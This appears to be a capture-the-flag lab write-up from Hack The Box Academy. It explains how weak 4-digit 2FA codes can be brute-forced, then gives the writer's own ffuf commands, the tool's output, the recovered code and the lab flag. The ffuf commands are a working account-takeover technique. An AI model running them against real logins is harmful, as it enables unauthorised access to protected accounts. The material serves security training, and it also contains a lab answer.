﻿Two-factor authentication (2FA) provides an additional layer of security to protect user accounts from unauthorized access. Typically, this is achieved by combining knowledge-based authentication (password) with ownership-based authentication (the 2FA device). However, 2FA can also be achieved by combining any other two of the major three authentication categories we discussed previously. Therefore, 2FA makes it significantly more difficult for attackers to access an account even if they manage to obtain the user's credentials. By requiring users to provide a second form of authentication, such as a one-time code generated by an authenticator app or sent via SMS, 2FA mitigates the risk of unauthorized access. This extra layer of security significantly enhances the overall security posture of an account, reducing the likelihood of successful account breaches.

---

## Attacking Two-Factor Authentication (2FA)

One of the most common 2FA implementations relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS. These TOTPs typically consist only of digits, making them potentially guessable if the length is insufficient and the web application does not implement measures against successive submission of incorrect TOTPs. For our lab, we will assume that we obtained valid credentials in a prior phishing attack:`admin:admin`. However, the web application is secured with 2FA, as we can see after logging in with the obtained credentials:

 ![](https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_1.png)

The message in the web application shows that the TOTP is a 4-digit code. Since there are only`10,000` possible variations, we can easily try all possible codes. To achieve this, let us first take a look at the corresponding request to prepare our parameters for`ffuf`:

![image](https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_2.png)

As we can see, the TOTP is passed in the`otp` POST parameter. Furthermore, we need to specify our session token in the`PHPSESSID` cookie to associate the TOTP with our authenticated session. Just like in the previous section, we can generate a wordlist containing all 4-digit numbers from`0000` to`9999` like so:


```shell-session
smoothment@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

Afterward, we can use the following command to brute-force the correct TOTP by filtering out responses containing the`Invalid 2FA Code` error message:

```shell-session
smoothment@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 648ms]
 * FUZZ: 6513
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 635ms]
 * FUZZ: 6514

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
 * FUZZ: 9999
```

As we can see, we get many hits. That is because our session successfully passed the 2FA check after we had supplied the correct TOTP. Since`6513` was the first hit, we can assume this was the correct TOTP. Afterward, our session is marked as fully authenticated, so all requests using our session cookie are redirected to`/admin.php`. To access the protected page, we can simply access the endpoint`/admin.php` in the web browser and see that we successfully passed 2FA.

# Question
---

![Pasted image 20250214162315.png](../../../../IMAGES/Pasted%20image%2020250214162315.png)

Ok, let's authenticate:

![Pasted image 20250214162403.png](../../../../IMAGES/Pasted%20image%2020250214162403.png)

Once we try to authenticate, we go to `/2fa.php` and subsequently, we are able to see this:


![Pasted image 20250214162451.png](../../../../IMAGES/Pasted%20image%2020250214162451.png)

We need a 2FA code, but we do not have one, what can we do now?

This is were brute-forcing the 2fa code, comes in handy, let's do it:

First, let's generate our list of codes:

```
seq -w 0 9999 > tokens.txt
```

Next, let's check the response of what an invalid code looks like, for example, if we enter 1111:

![Pasted image 20250214162733.png](../../../../IMAGES/Pasted%20image%2020250214162733.png)

We get `Invalid 2FA Code`, knowing all this, we can build our ffuf command:

```
ffuf -w ./tokens.txt -u http://94.237.54.116:39864/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=vcvsoagh3ordpepfb49nanpv57" -d "otp=FUZZ" -fr "Invalid 2FA Code" -ic -c -t 200 
```

After a while, we get this:

```
ffuf -w ./tokens.txt -u http://94.237.54.116:39864/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=vcvsoagh3ordpepfb49nanpv57" -d "otp=FUZZ" -fr "Invalid 2FA Code" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : POST
 :: URL : http://94.237.54.116:39864/2fa.php
 :: Wordlist : FUZZ: /home/samsepiol/tokens.txt
 :: Header : Content-Type: application/x-www-form-urlencoded
 :: Header : Cookie: PHPSESSID=vcvsoagh3ordpepfb49nanpv57
 :: Data : otp=FUZZ
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Regexp: Invalid 2FA Code
________________________________________________

0085 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 792ms]
0097 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 776ms]
0041 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 790ms]
0022 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 808ms]
0043 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 807ms]
0038 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 806ms]
```

The first code is our 2fa code:

```
0085
```

We can now authenticate:

![Pasted image 20250214163819.png](../../../../IMAGES/Pasted%20image%2020250214163819.png)

Flag is:

```
HTB{9837b33a1ef678c380addf7ef8a517de}
```
